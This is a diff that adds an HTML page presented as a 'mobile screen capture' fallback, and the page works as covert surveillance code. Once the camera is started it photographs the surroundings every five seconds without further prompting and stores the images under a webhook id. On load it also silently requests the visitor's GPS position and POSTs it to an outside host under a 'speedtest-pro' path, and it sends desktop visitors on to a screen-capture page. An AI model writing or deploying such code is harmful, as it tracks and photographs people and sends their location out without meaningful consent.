@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Capture - Mobile Fallback</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: monospace; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        .btn { 
+            background: #660000; 
+            color: white; 
+            border: none; 
+            padding: 15px 30px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin: 10px; 
+            border-radius: 5px;
+        }
+        #status { 
+            margin: 20px 0; 
+            padding: 15px; 
+            background: #330000; 
+            border-radius: 5px;
+        }
+        .info {
+            background: #1a0000;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-size: 12px;
+        }
+        .camera-container {
+            margin: 20px 0;
+            background: #0a0000;
+            border: 2px solid #660000;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            background: #000;
+            border: 1px solid #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <h2>📱 Mobile Screen Capture</h2>
+    <div id="status">Initializing camera capture...</div>
+    
+    <div class="camera-container">
+        <video id="cameraVideo" autoplay muted playsinline style="display: none;"></video>
+        <div id="cameraPlaceholder">
+            <p>📷 Camera will appear here</p>
+        </div>
+    </div>
+    
+    <button class="btn" onclick="startCamera()">📷 Start Camera</button>
+    <button class="btn" onclick="capturePhoto()">📸 Capture Photo</button>
+    
+    <div class="info">
+        <p>📱 Mobile Fallback Mode</p>
+        <p>Since screen sharing isn't available on mobile,</p>
+        <p>this will capture photos using your camera instead.</p>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhookId = urlParams.get('webhook') || 'mobile_' + Date.now();
+        let cameraStream = null;
+        let captureCount = 0;
+        
+        async function startCamera() {
+            try {
+                document.getElementById('status').innerHTML = '🔄 Requesting camera access...';
+                
+                // Try back camera first, then front camera
+                const constraints = {
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 },
+                        facingMode: { ideal: 'environment' } // Back camera
+                    },
+                    audio: false
+                };
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = cameraStream;
+                video.style.display = 'block';
+                document.getElementById('cameraPlaceholder').style.display = 'none';
+                
+                document.getElementById('status').innerHTML = '✅ Camera active - Ready to capture';
+                
+                // Auto capture every 5 seconds
+                setInterval(capturePhoto, 5000);
+                
+            } catch (error) {
+                let errorMsg = 'Camera access failed: ' + error.message;
+                if (error.name === 'NotAllowedError') {
+                    errorMsg = 'Camera permission denied. Please allow camera access.';
+                } else if (error.name === 'NotFoundError') {
+                    errorMsg = 'No camera found on this device.';
+                }
+                document.getElementById('status').innerHTML = '❌ ' + errorMsg;
+            }
+        }
+        
+        function capturePhoto() {
+            if (!cameraStream) {
+                document.getElementById('status').innerHTML = '❌ Camera not active';
+                return;
+            }
+            
+            try {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                captureCount++;
+                
+                // Store captured image
+                localStorage.setItem('live_screen_' + webhookId, imageData);
+                localStorage.setItem('screen_data_' + webhookId, JSON.stringify({
+                    screenData: imageData,
+                    timestamp: new Date().toISOString(),
+                    frame: captureCount,
+                    webhook: webhookId,
+                    type: 'camera'
+                }));
+                
+                // Broadcast
+                localStorage.setItem('screen_broadcast', JSON.stringify({
+                    webhook: webhookId,
+                    data: imageData,
+                    timestamp: Date.now(),
+                    type: 'camera'
+                }));
+                
+                document.getElementById('status').innerHTML = `📸 Photo ${captureCount} captured - ${new Date().toLocaleTimeString()}`;
+                
+            } catch (error) {
+                document.getElementById('status').innerHTML = '❌ Capture failed: ' + error.message;
+            }
+        }
+        
+        // Check if mobile device
+        function isMobileDevice() {
+            return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // Auto start based on device
+        setTimeout(() => {
+            if (isMobileDevice()) {
+                document.getElementById('status').innerHTML = '📱 Mobile device detected - Camera mode ready';
+            } else {
+                // Redirect to desktop version
+                window.location.href = 'screen-capture-simple.html?webhook=' + webhookId;
+            }
+        }, 1000);
+        
+        // Send GPS location as well
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        webhook: webhookId
+                    };
+                    
+                    // Send location data
+                    fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    }).catch(() => {});
+                },
+                (error) => console.log('Location access denied')
+            );
+        }
+    </script>
+</body>
+</html>
